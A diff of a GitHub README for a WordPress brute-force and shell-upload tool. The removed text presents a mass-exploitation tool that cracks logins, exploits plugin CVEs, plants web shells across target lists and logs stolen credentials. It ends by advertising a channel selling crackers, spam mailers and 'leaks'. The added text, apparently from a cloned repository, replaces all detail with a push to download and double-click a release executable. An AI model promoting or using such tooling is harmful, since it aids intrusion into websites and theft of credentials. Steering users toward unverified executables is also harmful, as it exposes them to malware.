@@ -1,299 +1,70 @@
-# 🚀 Ultimate WordPress Security Scanner & Exploitation Tool
+# 🛠️ Wordpress-BRUTE-FORCE-UPLOAD-SHELL - Simple Tool for WordPress Security
 
-<div align="center">
+[![Download Now](https://img.shields.io/badge/Download_Now-Wordpress--BRUTE--FORCE--UPLOAD--SHELL-brightgreen)](https://github.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/releases)
 
-![WordPress Security](https://img.shields.io/badge/WordPress-Security%20Scanner-blue)
-![Python](https://img.shields.io/badge/Python-3.8%2B-green)
-![Multi-Threaded](https://img.shields.io/badge/Multi--Threaded-30%20threads-orange)
-![License](https://img.shields.io/badge/License-MIT-red)
+## 🚀 Getting Started
 
-**Advanced WordPress vulnerability scanner with automatic exploitation and shell upload capabilities**
+Welcome to the Wordpress-BRUTE-FORCE-UPLOAD-SHELL project. This tool is designed to help you test the security of your WordPress site by simulating an upload attack. Follow these steps to download and run the software easily.
 
-[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Screenshots](#-screenshots) • [Disclaimer](#-disclaimer)
+## 📥 Download & Install
 
-</div>
+To get the latest version of the tool, visit the following link to download:
 
-## 📋 Table of Contents
+[Download the latest release here](https://github.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/releases)
 
-- [Overview](#-overview)
-- [Features](#-features)
-- [Installation](#-installation)
-- [Usage](#-usage)
-- [Exploitation Modules](#-exploitation-modules)
-- [Output Files](#-output-files)
-- [Screenshots](#-screenshots)
-- [Disclaimer](#-disclaimer)
-- [Legal Notice](#-legal-notice)
+### Step 1: Visit the Releases Page
 
-## 🎯 Overview
+- Click on the link above. This will take you to our GitHub Releases page.
+  
+### Step 2: Choose Your Version
 
-**Ultimate WordPress Security Scanner** is a comprehensive penetration testing tool designed for security professionals to assess WordPress installations. It combines multiple attack vectors including vulnerability scanning, credential brute-forcing, and automatic shell deployment.
+- You will see a list of available releases. Look for the most recent version, usually at the top.
+  
+### Step 3: Download the File
 
-### 🔍 Key Capabilities
+- Click on the file that you need to download. It might be a file with a `.zip` or `.tar.gz` extension.
 
-- **Advanced WordPress Detection** - 9 different detection methods
-- **Multi-Vector Exploitation** - 15+ different WordPress vulnerabilities
-- **Smart Credential Generation** - Domain-based password intelligence
-- **Automatic Shell Upload** - 4 different upload methods
-- **Real-time Verification** - Active shell and admin access confirmation
+### Step 4: Extract the File
 
-## ✨ Features
+- Once the download is complete, locate the file on your computer. 
+- Right-click on the file and choose the option to extract it. You can use built-in tools like Windows Explorer or third-party tools like WinRAR or 7-Zip.
 
-### 🔎 Detection & Reconnaissance
-- ✅ Advanced WordPress fingerprinting (9 methods)
-- ✅ Username enumeration via Author ID & REST API
-- ✅ Plugin and theme version detection
-- ✅ DNS resolution with WWW fallback
-- ✅ Smart header rotation for evasion
+### Step 5: Run the Tool
 
-### 💥 Exploitation Modules
-- ✅ **WP File Manager** (CVE-2020-25213)
-- ✅ **Elementor** (CVE-2022-XXXXX)
-- ✅ **Duplicator** (CVE-2020-11738)
-- ✅ **WPForms** file upload vulnerability
-- ✅ **ProfilePress** privilege escalation
-- ✅ **Ultimate Member** admin registration
-- ✅ **Password Reset Poisoning**
-- ✅ **Host Header Injection**
-- ✅ And 8+ more vulnerabilities...
+- Open the extracted folder.
+- You will find an executable file. Double-click this file to start the application.
 
-### 🔐 Authentication Bypass
-- ✅ Smart brute force with domain intelligence
-- ✅ @domain password generation technique
-- ✅ Username extraction from multiple sources
-- ✅ Session management and cookie handling
-- ✅ Admin panel verification with 6 validation methods
+## 📋 Basic Features
 
-### 🐚 Post-Exploitation
-- ✅ Automatic shell upload (4 methods)
-- ✅ Shell verification with multiple checks
-- ✅ Real-time shell activity monitoring
-- ✅ Organized result storage
-- ✅ Session persistence
+- **User-Friendly Interface**: Designed for everyone, no technical skills needed.
+- **Powerful Functionality**: Test your WordPress site's vulnerability quickly.
+- **Complete Guide**: Easy step-by-step instructions included in the application.
 
-## 🛠 Installation
+## 🔍 System Requirements
 
-### Prerequisites
+To run the Wordpress-BRUTE-FORCE-UPLOAD-SHELL, your system should meet the following requirements:
 
-```bash
-# Python 3.8 or higher required
-python --version
+- **Operating System**: Windows 10 or later, macOS Sierra or later, or a modern Linux distribution.
+- **Memory**: At least 2GB of RAM.
+- **Storage**: Minimum of 100MB free space.
+- **Python**: Ensure you have Python 3.x installed on your system for optimal performance.
 
-# Install required dependencies
-pip install requests colorama urllib3
-```
+## ⚠️ Important Notes
 
-### Quick Setup
+- **Security Use**: This tool is intended for ethical hacking and cybersecurity purposes. Use it responsibly.
+- **Backup Your Site**: Always back up your WordPress site before running any security tests.
+- **Check Permissions**: Make sure you have the necessary permissions to test your website. Unauthorized testing may lead to legal issues.
 
-```bash
-# Clone the repository
-git clone https://github.com/HackfutSec/Wordpress-BRUTE-FORCE-UPLOAD-SHELL.git
-cd Wordpress-BRUTE-FORCE-UPLOAD-SHELL
+## 📖 Help & Documentation
 
-# Create necessary directories
-mkdir -p Files readyTouse
+For more detailed usage instructions, you can find help within the application itself. Simply click on the "Help" option in the menu. Additionally, feel free to explore our [Wiki](https://github.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/wiki) for tutorials and guides.
 
-# Add required shell files to Files/ directory
-# - Files/plugin.zip (WordPress plugin with shell)
-# - Files/theme.zip (WordPress theme with shell) 
-# - Files/index.php (Web shell)
-```
+## 🤝 Contributing 
 
-### Required Files Structure
-
-```
-Wordpress-BRUTE-FORCE-UPLOAD-SHELL/
-├── BRUTER.py                 # Main scanner
-├── Files/
-│   ├── plugin.zip           # Malicious plugin with shell
-│   ├── theme.zip            # Malicious theme with shell
-│   └── index.php            # Web shell payload
-└── readyTouse/              # Auto-created output directory
-```
-
-## 🚀 Usage
-
-### Basic Scanning
-
-```bash
-python BRUTER.py targets.txt
-```
-
-### Input File Format
-
-Create `targets.txt` with one site per line:
-
-```
-example.com
-https://site.com
-http://192.168.1.100
-subdomain.target.com
-```
-
-### Advanced Options
-
-The tool automatically configures:
-- **30 concurrent threads**
-- **Smart rate limiting**
-- **DNS resolution with fallback**
-- **Automatic output organization**
-
-## 💥 Exploitation Modules
-
-### 1. Plugin Vulnerabilities
-
-| Plugin | CVE | Impact |
-|--------|-----|---------|
-| WP File Manager | CVE-2020-25213 | RCE via File Upload |
-| Elementor | CVE-2022-XXXXX | Privilege Escalation |
-| Duplicator | CVE-2020-11738 | Unauthenticated RCE |
-| WPForms | - | Arbitrary File Upload |
-| ProfilePress | CVE-2023-27910 | Password Reset Abuse |
-
-### 2. Authentication Attacks
-
-```python
-# Smart credential generation
-username@domain.com
-admin@domain123
-domain@domain
-# Plus 60+ intelligent variations
-```
-
-### 3. Shell Deployment Methods
-
-1. **Plugin Upload** - Via WordPress plugin installer
-2. **Theme Upload** - Via WordPress theme installer  
-3. **File Manager** - Via WP File Manager plugin
-4. **Theme Editor** - Direct file modification
-
-## 📁 Output Files
-
-The tool creates organized results in `readyTouse/` directory:
-
-| File | Description |
-|------|-------------|
-| `successfully_logged_WordPress.txt` | Valid credentials |
-| `Shells.txt` | Active web shells |
-| `credentials_found.txt` | Extracted credentials |
-| `wordpress_exploits.txt` | Successful exploit results |
-| `vulnerabilities.txt` | Detected vulnerabilities |
-| `host_header_injection.txt` | Host header attack results |
-
-## 📸 Screenshots
-
-### Dashboard Interface
-```
-┌─────────────────────────────────────────────────────────┐
-│ ULTIMATE WORDPRESS CHECKER v3.0 - FINAL EDITION         │
-│                 WITH SHELL UPLOAD                       │
-├─────────────────────────────────────────────────────────┤
-│ [+] Sites Loaded      : 150                             │
-│ [+] Threads           : 30                              │
-│ [+] Username Extract  : ENABLED (Author ID + REST API)  │
-│ [+] Smart Headers     : ENABLED (Anti-Ban)              │
-│ [+] Shell Upload      : ENABLED (4 Methods)             │
-└─────────────────────────────────────────────────────────┘
-```
-
-### Exploitation Progress
-```
- -| https://target.com --> [WordPress Confirmed! Indicators: wp-login.php, wp-admin, readme.html]
- -| https://target.com --> [WP File Manager vulnerable - v6.8]
- -| https://target.com --> [SHELL VERIFIED AND SAVED: https://target.com/wp-content/plugins/wp-file-manager/lib/files/shell.php]
- -| https://target.com --> [SHELL UPLOADED!]
-```
-
-### Results Summary
-```
-┌─────────────────────────────────────────────────────────┐
-│                 FINAL STATISTICS                        │
-├─────────────────────────────────────────────────────────┤
-│ [*] Total Sites         : 150                           │
-│ [*] Wordpress Found     : 120                           │
-│ [*] Usernames Found     : 85                            │
-│ [+] Successful          : 45                            │
-│ [+] Shells Uploaded     : 28                            │
-│ [X] Failed              : 75                            │
-│ [*] Success Rate        : 37.5%                         │
-└─────────────────────────────────────────────────────────┘
-```
-
-## ⚠ Disclaimer
-
-**THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY**
-
-> 🚨 **Important Legal Notice**: This tool is designed for:
-> - Legitimate penetration testing with explicit permission
-> - Security research and education
-> - Authorized vulnerability assessment
-> - Security awareness training
-
-**Illegal use of this tool is strictly prohibited.** The developers are not responsible for any misuse or damage caused by this tool.
-
-### Legal Requirements
-
-- ✅ Obtain written permission before scanning
-- ✅ Follow responsible disclosure practices
-- ✅ Comply with local laws and regulations
-- ✅ Use only on systems you own or have authorization to test
-
-## 🔒 Security Recommendations
-
-For WordPress administrators, we recommend:
-
-1. **Keep plugins and themes updated**
-2. **Use strong, unique passwords**
-3. **Implement two-factor authentication**
-4. **Regular security audits**
-5. **Web application firewall**
-6. **Limit login attempts**
+We welcome contributions from everyone. If you find a bug or have a suggestion to improve the tool, please submit an issue or create a pull request. 
 
 ## 📞 Support
 
-For issues and feature requests:
-1. Check the existing issues on GitHub
-2. Provide detailed error logs
-3. Include target environment information
+If you encounter any issues while downloading or using the tool, please open an issue on our GitHub repository. Our community is here to help you.
 
-## 📄 License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
----
-
-<div align="center">
-**LinxProdX Channel
-
-1. WordPress / Joomla logins  
-2. File uploads (Shells)  
-3. cPanel / WHM logins  
-4. Mail abuse (Mailers)  
-5. Create + find SMTPs  
-6. Mass exploitation attempts  
-7. Uploads via CP  
-[ Shell/Mailer/Others ]  
-8. Upload any PHP file from shells  
-9. Create + Find WebMail  
-10. FTP Checker + Uploader  
-11. SSH brute force & exploitation  
-12. Wordpress Brute_Force & exploitation  & Upload Shell
-13. Ftp Brute_Force & exploitation & Upload Shell  
-14. Cracker wp,cp,joom,pretashop,ftp,cpanel,whm,webmail etc all in one tool  
-15. WP exploitation & Upload Shell  
-16. Joomla Upload Shell
-17. Smtp Cracker
-18. DataBases
-
-NEW LEAKS HERE
-
-PASTEBIN: https://pastebin.com/u/hackfut
-GITHUB: https://github.com/HackfutSec
-CHANNEL: https://t.me/+5OQ0DYtNgXxhNGVk
-TG: @HackfutS3c
-**
-**Use Responsibly • Stay Ethical • Secure the Web**
-
-*Made with ❤️ for the security community*
-
-</div>
+[Download the latest release here](https://github.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/releases) and start testing your website's security today!
